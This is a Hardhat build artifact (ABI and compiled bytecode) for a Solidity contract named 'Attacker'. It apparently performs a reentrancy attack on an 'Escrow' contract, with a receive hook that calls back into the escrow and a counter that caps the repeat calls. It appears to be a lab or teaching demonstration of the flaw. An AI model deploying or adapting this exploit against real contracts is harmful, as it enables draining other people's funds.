{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Attacker.sol",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "escrow",
      "outputs": [
        {
          "internalType": "contract Escrow",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "reentrantCallCount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_escrowAddress",
          "type": "address"
        }
      ],
      "name": "setEscrow",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50600180546001600160a01b0319163317905561030b806100326000396000f3fe6080604052600436106100595760003560e01c806312065fe0146100de57806337d746ae146101005780638da5cb5b146101165780639e5faafc1461014e578063c10c354614610163578063e2fdcc171461018357600080fd5b366100d9576002805490600061006e8361027e565b91905055506002805410156100d75760008054604080516386d1a69f60e01b815290516001600160a01b03909216926386d1a69f9260048084019382900301818387803b1580156100be57600080fd5b505af11580156100d2573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100ea57600080fd5b50475b6040519081526020015b60405180910390f35b34801561010c57600080fd5b506100ed60025481565b34801561012257600080fd5b50600154610136906001600160a01b031681565b6040516001600160a01b0390911681526020016100f7565b34801561015a57600080fd5b506100d76101a3565b34801561016f57600080fd5b506100d761017e3660046102a5565b6101fe565b34801561018f57600080fd5b50600054610136906001600160a01b031681565b60008054604080516386d1a69f60e01b815290516001600160a01b03909216926386d1a69f9260048084019382900301818387803b1580156101e457600080fd5b505af11580156101f8573d6000803e3d6000fd5b50505050565b6001546001600160a01b0316331461025c5760405162461bcd60e51b815260206004820152601960248201527f4f6e6c79206f776e65722063616e2073657420657363726f7700000000000000604482015260640160405180910390fd5b600080546001600160a01b0319166001600160a01b0392909216919091179055565b60006001820161029e57634e487b7160e01b600052601160045260246000fd5b5060010190565b6000602082840312156102b757600080fd5b81356001600160a01b03811681146102ce57600080fd5b939250505056fea26469706673582212205f2c67f940353efa36ea0b54a95a8deb8d84e180a13e79bb7f31f781df8bc59d64736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}